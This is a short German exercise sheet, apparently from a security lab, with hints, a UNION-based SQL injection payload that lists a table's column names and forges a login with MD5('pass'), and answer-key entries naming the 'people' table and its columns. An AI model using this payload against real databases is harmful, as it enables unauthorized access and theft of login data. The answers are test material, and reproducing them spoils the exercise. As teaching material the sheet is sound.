Nun sollen die Spaltennamen der Tabelle ausgelesen werden.

Tipp:
Sie benötigen `GROUP_CONCAT()` und `INFORMATION_SCHEMA.COLUMNS`.

Tipp 2:
https://dev.mysql.com/doc/refman/8.0/en/information-schema-innodb-columns-table.html

Statement:
' AND 1=0 UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'people'), MD5('pass'), 1, 1;--

>>4) In welcher Tabelle vermuten Sie die Login-Daten?<<
     === people

>>5) Welche Spalten enthält die Tabelle? Geben Sie die Spaltennamen in der Reihenfolge der Ausgabe und mit Leerzeichen getrennt an.<<
     === name pass email state
